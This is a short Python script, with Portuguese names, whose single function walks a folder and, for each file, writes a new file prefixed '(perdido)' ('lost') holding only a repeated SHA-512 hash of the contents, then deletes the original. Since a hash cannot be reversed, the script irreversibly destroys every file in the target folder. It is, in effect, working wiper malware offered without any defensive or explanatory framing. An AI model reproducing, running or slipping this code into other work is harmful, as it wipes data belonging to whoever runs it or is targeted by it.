import hashlib
import os
import string
import sys

def destruir_pasta(c):
    for files in os.listdir(c):
        os.chdir(c)
        with open(files, 'rb') as r:
            data = r.read()
            encrypt = hashlib.sha512(data).hexdigest()
            encrypt = encrypt.encode('utf-8') #resolveu o erro
            new_file = '(perdido)' +os.path.basename(files)
            with open(new_file, 'wb') as n:
                n.write(encrypt*0x31)
                n.close()
                r.close()

                os.remove(files)
